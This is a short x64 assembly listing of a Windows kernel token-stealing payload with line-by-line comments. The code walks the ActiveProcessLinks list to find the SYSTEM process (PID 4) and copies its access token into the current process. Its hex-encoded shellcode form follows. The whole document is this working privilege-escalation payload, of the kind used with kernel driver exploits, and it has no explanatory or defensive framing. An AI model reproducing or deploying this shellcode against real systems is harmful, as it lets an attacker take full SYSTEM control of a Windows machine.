		[BITS 64]
		_start:
			mov rax, [gs:0x188]	              ; Current thread (_KTHREAD)
			mov rax, [rax + 0xb8]	            ; Current process (_EPROCESS)
			mov rbx, rax		                  ; Copy current process (_EPROCESS) to rbx
		__loop:
			mov rbx, [rbx + 0x2f0] 	          ; ActiveProcessLinks
			sub rbx, 0x2f0		                ; Go back to current process (_EPROCESS)
			mov rcx, [rbx + 0x2e8] 	          ; UniqueProcessId (PID)
			cmp rcx, 4 		                    ; Compare PID to SYSTEM PID 
			jnz __loop		                    ; Loop until SYSTEM PID is found
			mov rcx, [rbx + 0x358]	          ; SYSTEM token is @ offset _EPROCESS + 0x358
			and cl, 0xf0		                  ; Clear out _EX_FAST_REF RefCnt
			mov [rax + 0x358], rcx	          ; Copy SYSTEM token to current process
			xor rax, rax		                  ; STATUS_SUCCESS
			ret			                          ;


; Shellcode - "\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x48\x89\xC3\x48\x8B\x9B\xF0\x02\x00\x00\x48\x81\xEB\xF0\x02\x00\x00\x48\x8B\x8B\xE8\x02\x00\x00\x48\x83\xF9\x04\x75\xE5\x48\x8B\x8B\x58\x03\x00\x00\x80\xE1\xF0\x48\x89\x88\x58\x03\x00\x00\x48\x31\xC0\xC3"
